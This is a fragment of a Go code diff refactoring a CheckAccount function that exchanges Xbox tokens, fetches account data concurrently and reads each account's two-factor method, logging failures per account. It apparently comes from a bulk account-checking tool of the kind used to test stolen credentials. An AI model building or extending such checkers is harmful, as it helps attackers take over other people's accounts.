+			GetStats().ExportRetries(acc, "Failed to parse Xbox exchange response", true)
 			return false
 		}
 
@@ -1358,9 +1388,9 @@ func CheckAccount(acc string) bool {
 			accessToken = ""
 		}
 	}
-	if err2 != nil {
-		LogError(fmt.Sprintf("Xbox token exchange failed for %s: %v", acc, err2))
-		GetStats().ExportRetries(acc, err2.Error(), true)
+	if err != nil {
+		LogError(fmt.Sprintf("Xbox token exchange failed for %s: %v", acc, err))
+		GetStats().ExportRetries(acc, err.Error(), true)
 		return false
 	}
 
@@ -1401,27 +1431,27 @@ func CheckAccount(acc string) bool {
 	fetch := func(url, method string, headers map[string]string, key string) {
 		defer wg.Done()
 		var req *http.Request
-		var err2 error
+		var err error
 		if method == "POST" {
-			req, err2 = http.NewRequest("POST", url, strings.NewReader("{}"))
+			req, err = http.NewRequest("POST", url, strings.NewReader("{}"))
 		} else {
-			req, err2 = http.NewRequest("GET", url, nil)
+			req, err = http.NewRequest("GET", url, nil)
 		}
-		if err2 != nil {
+		if err != nil {
 			return
 		}
 		for h, v := range headers {
 			req.Header.Set(h, v)
 		}
 
-		resp2, err2 := client.Do(req)
-		if err2 != nil {
+		resp, err := client.Do(req)
+		if err != nil {
 			return
 		}
-		defer resp2.Body.Close()
+		defer resp.Body.Close()
 
-		body, err2 := readResponseBody(resp2)
-		if err2 != nil {
+		body, err := readResponseBody(resp)
+		if err != nil {
 			return
 		}
 		mu.Lock()
@@ -1478,16 +1508,16 @@ func CheckAccount(acc string) bool {
 			if method, ok := mfaVal.(string); ok {
 				tfaMethod = strings.ToLower(method)
 			}
-		} else if tfaProvider, ok := account["tfaProvider"]; ok && tfaProvider != nil {
-			if method, ok := tfaProvider.(string); ok {
-				tfaMethod = strings.ToLower(method)
-			}
-		} else if authType, ok := account["twoFactorAuthType"]; ok && authType != nil {
+		} else if authType, ok := account["tfaProvider"]; ok && authType != nil {
 			if method, ok := authType.(string); ok {
 				tfaMethod = strings.ToLower(method)
 			}
-		} else if authType2, ok := account["tfaType"]; ok && authType2 != nil {
+		} else if authType2, ok := account["twoFactorAuthType"]; ok && authType2 != nil {
 			if method, ok := authType2.(string); ok {
+				tfaMethod = strings.ToLower(method)
+			}
+		} else if authType3, ok := account["tfaType"]; ok && authType3 != nil {
+			if method, ok := authType3.(string); ok {
 				tfaMethod = strings.ToLower(method)
 			}
 		}
